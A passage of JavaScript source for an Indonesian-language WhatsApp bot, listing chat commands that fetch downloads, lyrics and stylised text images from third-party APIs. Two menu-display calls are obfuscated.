_0x578d45===undefined?(_0xdcbf69=_0x46c2['kwqPHV'](_0xdcbf69),_0x46c2['NfjMQD'][_0x151dd6]=_0xdcbf69):_0xdcbf69=_0x578d45,_0xdcbf69;}(function(_0x8c7b1e,_0x4b7979){var _0x17c26f=_0x46c2;while(!![]){try{var _0x39a3e1=parseInt(_0x17c26f(0x177))*-parseInt(_0x17c26f(0x178))+parseInt(_0x17c26f(0x17d))+-parseInt(_0x17c26f(0x17a))+-parseInt(_0x17c26f(0x17c))*-parseInt(_0x17c26f(0x17e))+parseInt(_0x17c26f(0x17b))+parseInt(_0x17c26f(0x17f))*parseInt(_0x17c26f(0x172))+-parseInt(_0x17c26f(0x171));if(_0x39a3e1===_0x4b7979)break;else _0x8c7b1e['push'](_0x8c7b1e['shift']());}catch(_0x5d6e2e){_0x8c7b1e['push'](_0x8c7b1e['shift']());}}}(_0xdcbf,0xa55ef),dila[_0x3fbd6e(0x173)](from,donlot,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x3fbd6e(0x174),...from?{'remoteJid':'status@broadcast'}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x3fbd6e(0x179)](_0x3fbd6e(0x175)),'surface':0xc8,'message':_0x3fbd6e(0x176),'orderTitle':_0x3fbd6e(0x176),'sellerJid':_0x3fbd6e(0x174)}}}}));
break
					case 'bitly':
					if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
				dila.updatePresence(from, Presence.composing) 
                data = await fetchJson(`https://tobz-api.herokuapp.com/api/bitly?url=${args.join(' ')}&apikey=BotWeA`)
                hasil = `link : ${args.join(' ')}\n\nOutput : ${data.result}`
                reply(hasil)
                break
					case 'mimpi':
					if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
 await limitAdd(sender)
			    anu = await fetchJson(`https://api.arugaz.my.id/api/primbon/tafsirmimpi?mimpi=${args.join(' ')}`, {method: 'get'})
			        mimpi = `Arti Mimpi *${args.join(' ')}* Adalah:\n${anu.result.hasil}`
			        dila.sendMessage(from, mimpi, text, {quoted:Lan, contextInfo: {"forwardingScore": 999, "isForwarded": true}}) 
			       	break
					case 'jadwaltv':
					if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
 await limitAdd(sender)
                 jadwaltv = `${args.join(' ')}`
                anu = await fetchJson(`https://api.zeks.xyz/api/?channel=${jadwaltv}&apikey=apivinz`, {method: 'get'})
                jtv = `${anu.result}`
                dila.sendMessage(from, jtv, text, {quoted:Lan, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
               	break
 case 'lirik':
 if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
 await limitAdd(sender)
 pe = args.join(' ')
 anu = await fetchJson(`https://videfikri.com/api/liriklagu/?query=${pe}`)
 buf = await getBuffer(`${anu.result.lirik}`)
 dila.sendMessage(from, buf, text, {quoted:Lan })
 break
					case 'tiktok':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(dla.Iv())
 		if (!q) return reply('Linknya?')
 		reply(dla.wait())
		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		console.log(result)
    		const { videonowm, videonowm2, text } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
    		.then(async (a) => {
    		me = `*Title* : ${text}\n*Link* : ${a.data}`
		dila.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:Lan,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
   case 'tiktokaudio':
     if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return reply('Linknya?')
 		reply(dla.wait())
 		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		const { music,text } = result
		dila.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:Lan})
		})
     		.catch(e => console.log(e))
     		break
				case 'igphoto':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply('Link Nya Mana Kak')
					anu = await fetchJson(`https://api.xteam.xyz/dl/ig?url=${q}&APIKEY=${xteam}`)
					reply(dla.wait())
					buff = await getBuffer(anu.result.data[0].data)
					dila.sendMessage(from, buff, image, { quoted: Lan })
					break

				case 'ig':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
 pe = args.join(' ')
 anu = await fetchJson(`https://videfikri.com/api/igdl/?url=${pe}`)
 buf = await getBuffer(`${anu.result.video}`)
 dila.sendMessage(from, buf, video, {quoted:Lan, caption: `Nih kak` })
 break
				case 'joox':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/joox?q=${args.join(' ')}&apikey=BotWeA`, { method: 'get' })
				teks = '「 *_JOOX MP3_* 」\n'
				const joox = data.result
				teks += `\n❏ *Judul* : ${joox.title}\n❏ *Album* : ${joox.album}\n❏ *Publish At* : ${joox.dipublikasi}\n\n Bentar kak Audionya lagi dikirim`
				thumb = await getBuffer(joox.thumb)
				reply(dla.wait())
				dila.sendMessage(from, thumb, image, { quoted:Lan, caption: teks })
				buffer = await getBuffer(joox.mp3)
				dila.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', filename: `${joox.title}.mp3`, quoted:Lan })
				break
				case 'makermenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const Laner = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}comictext\`\`\`
\`\`\`├ ${prefix}hekerlogo\`\`\`
\`\`\`├ ${prefix}graffiti\`\`\`
\`\`\`├ ${prefix}glowtext\`\`\`
\`\`\`├ ${prefix}covertext\`\`\`
\`\`\`├ ${prefix}narutotext\`\`\`
\`\`\`├ ${prefix}erodedtext\`\`\`
\`\`\`├ ${prefix}walltext\`\`\`
\`\`\`├ ${prefix}vietteltext\`\`\`
\`\`\`├ ${prefix}wingstext\`\`\`
\`\`\`├ ${prefix}halloween\`\`\`
\`\`\`├ ${prefix}graffiti2\`\`\`
\`\`\`├ ${prefix}graffiti3\`\`\`
\`\`\`├ ${prefix}foiltext\`\`\`
\`\`\`├ ${prefix}bloodtext\`\`\`
\`\`\`├ ${prefix}hekertext\`\`\`
\`\`\`├ ${prefix}bokehtext\`\`\`
\`\`\`├ ${prefix}carbontext\`\`\`
\`\`\`├ ${prefix}avengerstext\`\`\`
\`\`\`├ ${prefix}watertext\`\`\`
\`\`\`├ ${prefix}firetext\`\`\`
\`\`\`├ ${prefix}metaltext\`\`\`
\`\`\`├ ${prefix}ballontext\`\`\`
\`\`\`├ ${prefix}gemboktext\`\`\`
\`\`\`├ ${prefix}bannerff\`\`\`
\`\`\`├ ${prefix}aloklogo\`\`\`
\`\`\`├ ${prefix}miyalogo\`\`\`
\`\`\`├ ${prefix}gamelogo\`\`\`
\`\`\`├ ${prefix}blackpink\`\`\`
\`\`\`├ ${prefix}thundername\`\`\`
\`\`\`├ ${prefix}silktext\`\`\`
\`\`\`├ ${prefix}partytext\`\`\`
\`\`\`├ ${prefix}romancetext\`\`\`
\`\`\`├ ${prefix}googletext\`\`\`
\`\`\`├ ${prefix}glowtext2\`\`\`
\`\`\`├ ${prefix}lovemessage\`\`\`
\`\`\`├ ${prefix}glitchtext\`\`\`
\`\`\`├ ${prefix}galaxytext\`\`\`
\`\`\`├ ${prefix}pornhub\`\`\`
\`\`\`├ ${prefix}tahta\`\`\`
\`\`\`├ ${prefix}wetglass\`\`\`
\`\`\`├ ${prefix}stylelogo\`\`\`
\`\`\`├ ${prefix}watercolor\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x41eb=['oejQz1jlsa','mebZlNDOyxrZyxbWlM5LDa','mtq1ota5D0rYqunp','twfRzxiGtwvUDq','mJeZmdu1BwnAA2D0','lI9KBNmVDgH1BwjUywLSlMPWzwC','ndG0mdLUvhHJDuC','oeDXCvDxrq','CMvHzezPBgvtEw5J','mZC4mdvXtxPhs1y','mtq5ntm2rML0rwzV','mJC2nJz5vw55zxq','otaXmtjotLDTywu','mvPWqxLQBq'];var _0x256669=_0x2fe2;function _0x2fe2(_0x3d3990,_0x56b7f7){_0x3d3990=_0x3d3990-0x1a5;var _0x41eb59=_0x41eb[_0x3d3990];if(_0x2fe2['XKDGlL']===undefined){var _0x2fe25b=function(_0xe8f910){var _0x461211='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x22336c='';for(var _0x19d96f=0x0,_0x25d381,_0x279afa,_0x5dcffb=0x0;_0x279afa=_0xe8f910['charAt'](_0x5dcffb++);~_0x279afa&&(_0x25d381=_0x19d96f%0x4?_0x25d381*0x40+_0x279afa:_0x279afa,_0x19d96f++%0x4)?_0x22336c+=String['fromCharCode'](0xff&_0x25d381>>(-0x2*_0x19d96f&0x6)):0x0){_0x279afa=_0x461211['indexOf'](_0x279afa);}return _0x22336c;};_0x2fe2['ywVlmR']=function(_0x2b5eef){var _0x172cd8=_0x2fe25b(_0x2b5eef);var _0x119a9a=[];for(var _0x5be10e=0x0,_0x2f582f=_0x172cd8['length'];_0x5be10e<_0x2f582f;_0x5be10e++){_0x119a9a+='%'+('00'+_0x172cd8['charCodeAt'](_0x5be10e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x119a9a);},_0x2fe2['fSrOtV']={},_0x2fe2['XKDGlL']=!![];}var _0x64a29d=_0x41eb[0x0],_0x28715d=_0x3d3990+_0x64a29d,_0x4f93ed=_0x2fe2['fSrOtV'][_0x28715d];return _0x4f93ed===undefined?(_0x41eb59=_0x2fe2['ywVlmR'](_0x41eb59),_0x2fe2['fSrOtV'][_0x28715d]=_0x41eb59):_0x41eb59=_0x4f93ed,_0x41eb59;}(function(_0xfc68e,_0x469f3e){var _0x413baa=_0x2fe2;while(!![]){try{var _0x1fcb44=-parseInt(_0x413baa(0x1b0))+parseInt(_0x413baa(0x1ae))+-parseInt(_0x413baa(0x1b1))*parseInt(_0x413baa(0x1a7))+parseInt(_0x413baa(0x1a6))+-parseInt(_0x413baa(0x1a8))+-parseInt(_0x413baa(0x1a9))*parseInt(_0x413baa(0x1ac))+-parseInt(_0x413baa(0x1a5))*-parseInt(_0x413baa(0x1aa));if(_0x1fcb44===_0x469f3e)break;else _0xfc68e['push'](_0xfc68e['shift']());}catch(_0x32a4e6){_0xfc68e['push'](_0xfc68e['shift']());}}}(_0x41eb,0x26e29),dila['sendMessage'](from,Laner,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x256669(0x1ab),...from?{'remoteJid':'status@broadcast'}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x256669(0x1b2)](_0x256669(0x1af)),'surface':0xc8,'message':'Maker\x20Menu','orderTitle':_0x256669(0x1ad),'sellerJid':'0@s.whatsapp.net'}}}}));
					break

				case 'comictext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}comictext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/comic_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'hekerlogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}hekerlogo Dns`)
					reply(`[🗿] Buset Hemker`)
					vhbuff = await getBuffer(`https://api.vhtear.com/hacker_avatar?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'graffiti':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(10)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}graffiti Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/cool_wall_graffiti?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'glowtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}glowtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/glow_metallic?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'covertext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}covertext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/cover_banner?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'narutotext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}narutotext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/naruto_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'erodedtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}erodedtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/eroded_metal?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'walltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}walltext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/the_wall?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'vietteltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}vietteltext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/viettel_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'wingstext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}wingstext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/wings_galaxy?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'halloween':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}halloween Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/halloween_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'graffiti2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(11)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}graffiti2 Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/girl_graffiti?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'graffiti3':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}graffiti3 Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/cartoon_graffiti?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'foiltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}foiltext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/foil_text?text=VHTEAR&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'bloodtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}bloodtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/blood_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'hekertext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}hekertext Dns`)
					reply(`[??] Heker AbiZzz`)
					vhbuff = await getBuffer(`https://api.vhtear.com/matrix_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'bokehtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}bokehtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/bokeh_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'carbontext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}carbontext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/carbon_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'avengerstext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(14)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}avengerstext Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/avengers_text?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'watertext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}watertext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/water_maker?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'firetext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}firetext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/fire_maker?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'metaltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}metaltext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/metal_maker?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'ballontext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}ballontext Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/balloonmaker?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'gemboktext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}gemboktext 11 01 2021 & Dns Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/padlock?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'bannerff':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(10)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}bannerff Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/bannerff?title=${ve}&text=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'aloklogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}aloklogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/logoff?hero=alok&text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'miyalogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}miyalogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/logoml?hero=miya&text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'gamelogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}gamelogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/gamelogo?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'blackpink':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}blackpink Dns`)
					reply(`[😱] Hah Blekping :v`)
					vhbuff = await getBuffer(`https://api.vhtear.com/blackpinkicon?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'thundername':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}thundername Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/thundertext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'silktext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}silktext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/silktext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'partytext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}partytext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/partytext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'romancetext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}romancetext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/romancetext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'googletext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					var ga = gh.split("&")[2];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}googletext Dns & Bot & Wea`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/googletext?text1=${ve}&text2=${za}&text3=${ga}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'glowtext2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}glowtext2 Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/glowtext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'lovemessage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
